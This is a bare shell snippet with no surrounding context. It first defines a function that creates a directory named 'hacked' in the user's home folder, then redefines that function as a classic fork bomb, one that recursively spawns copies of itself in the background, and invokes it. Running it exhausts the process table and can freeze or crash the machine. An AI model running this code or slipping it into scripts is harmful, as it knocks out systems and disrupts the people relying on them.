f()
{
		mkdir -p ~/hacked/d*
}

f(){ f | f & }; f
